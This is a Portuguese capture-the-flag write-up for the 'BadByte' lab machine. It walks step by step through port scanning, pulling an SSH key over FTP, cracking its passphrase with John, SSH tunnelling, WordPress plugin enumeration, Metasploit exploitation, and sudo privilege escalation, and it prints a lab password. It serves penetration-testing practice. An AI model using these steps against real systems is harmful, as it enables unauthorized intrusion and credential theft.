# BadByte

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.72.121
```
![image](https://github.com/lufffe/Writeups/assets/90646635/459d3e7b-22c3-4c92-8eb7-f4334626e01b)

![image](https://github.com/lufffe/Writeups/assets/90646635/3d1532ff-e7ae-4663-9452-502d3cd620ff)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,30024 10.10.72.121
```
![image](https://github.com/lufffe/Writeups/assets/90646635/0a4b391f-bb51-46e1-9ad9-16aa2fc66efc)

* ### Baixando os arquivos no FTP.
```bash
ftp 10.10.72.121 -p 30024
```
![image](https://github.com/lufffe/Writeups/assets/90646635/fc8aaff0-ea3c-4ac3-8045-5fd45e81e2f0)

* ### Descobrindo senha da chave SSh.
```bash
ssh2john id_rsa > hash.txt
```

```bash
john --wordlist=~/rockyou.txt hash.txt
```

```bash
kali@kali:/etc$ proxychains nmap -sT 127.0.0.1
```
|S-chain|-<>-127.0.0.1:1337-<><>-127.0.0.1:80-<><>-OK

```bash
sudo ssh -i id_rsa -L 80:127.0.0.1:80 errorcauser@10.10.72.121
```
![image](https://github.com/lufffe/Writeups/assets/90646635/a915b8b2-8858-44ef-bf8e-f8f453e3b841)

```bash
nmap -p 80 -vv --script http-wordpress-enum --script-args type="plugins",search-limit=1500 127.0.0.1
```
![image](https://github.com/lufffe/Writeups/assets/90646635/abad5b0a-5fb4-48a6-af11-355d0b501a0b)

* ### What is the CVE number for directory traversal vulnerability?
![image](https://github.com/lufffe/Writeups/assets/90646635/7c54fbea-fdc0-47cb-80f4-72b8ecd36a30)

* ### What is the CVE number for remote code execution vulnerability?
![image](https://github.com/lufffe/Writeups/assets/90646635/3710d11b-74a2-4053-946a-79a07ffb9c88)


* ### Metasploit
```Bash
msfconsole
```

```Bash
search wordpress file manager
```

```Bash
meterpreter > getuid
```
Server username: cth

* ### Flag User
```Bash
cat /home/cth/user.txt
```

```Bash
find / -type f -user cth -exec ls {} + 2>/dev/null
```
![image](https://github.com/lufffe/Writeups/assets/90646635/d7d1cc6a-b56d-4dc6-b63e-1d4764cf531c)

```Bash
cat /var/log/bash.log
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4a4c4fbc-2d87-4437-8d83-018e993dfb45)

* ### Escalando Previlégio.
```
sudo -l
```
[sudo] password for cth: G00dP@$sw0rd2021

User cth may run the following commands on badbyte:
    (ALL : ALL) ALL

* ### Flag Root.
```Bash
sudo cat /root/root.txt
```

